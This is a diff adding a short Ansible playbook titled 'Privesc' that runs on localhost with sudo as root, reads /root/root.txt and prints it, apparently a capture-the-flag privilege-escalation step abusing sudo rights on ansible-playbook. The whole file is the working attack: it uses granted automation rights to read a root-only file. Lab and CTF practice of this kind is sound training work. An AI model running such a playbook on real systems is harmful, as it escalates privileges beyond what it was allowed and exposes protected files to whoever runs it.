@@ -1,0 +1,15 @@
+---
+  - name: Privesc
+    hosts: localhost
+    become: true
+    become_user: root
+    become_method: sudo
+    tasks:
+
+    - name: Shell command
+      shell:
+         "cat /root/root.txt"
+      register: cmd
+      tags: cmd
+
+    - debug: msg="{{cmd.stdout}}"
